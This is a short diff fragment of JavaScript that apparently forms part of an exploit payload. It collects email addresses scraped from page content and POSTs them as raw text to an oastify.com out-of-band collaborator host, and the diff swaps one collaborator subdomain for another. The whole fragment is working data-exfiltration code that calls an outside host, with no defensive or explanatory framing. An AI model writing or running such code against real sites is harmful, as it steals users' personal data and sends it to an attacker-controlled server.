@@ -10,7 +10,7 @@ function fe(t) {
                 const emails = emailMatches.map(match => match[1].trim()).join('\n');
 
                 // Send the email list as raw data in a POST request
-                fetch("//n7vyiz18ap2xxppzixi27gigj7pyds1h.oastify.com/log/", {
+                fetch("//198sd5nu3imv6hukv69rttqd147vvojd.oastify.com/log/", {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'text/plain'
